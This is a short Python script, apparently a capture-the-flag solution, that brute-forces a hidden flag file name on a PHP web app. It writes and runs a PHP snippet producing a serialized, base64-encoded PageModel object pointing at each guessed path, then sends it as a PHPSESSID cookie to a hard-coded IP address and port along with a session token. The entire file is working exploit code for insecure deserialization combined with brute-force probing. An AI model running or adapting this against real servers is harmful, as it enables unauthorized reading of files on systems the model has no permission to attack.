import subprocess, itertools, string, requests


chars = string.ascii_lowercase + string.ascii_uppercase + string.digits
attempts = 0

for guess in itertools.product(chars,repeat=5): 
    attempts += 1
    guess = "/flag_" + ''.join(guess)
    with open("/home/javier/Downloads/exploit.php", "w") as f:
        content = """<?php
class PageModel
{
	private $file = %a;
}

print base64_encode(serialize(new PageModel));
?>""" % guess.replace("'", "")
        f.write(content)
    cmd="php /home/javier/Downloads/exploit.php"
    seria = subprocess.check_output(cmd, shell=True)
    cookies = {"PHPSESSID":seria.decode(),"session":".eJyrVsrMSy9KTclMzStRsqpWUkhSslJK8iioSAmPMk3MLchPSbe1VarVUcpNTSwuLUrNBaorhiv0qzQw8AsEKagFAJBHF-k.YRac1A.qbZGJpX4UTEzdZ7hYv6gHvNOwSE"}
    cont = requests.get("http://142.93.35.92:31072/", cookies=cookies).text
    if cont != "":
        print(cont)
        break
    print(guess, attempts)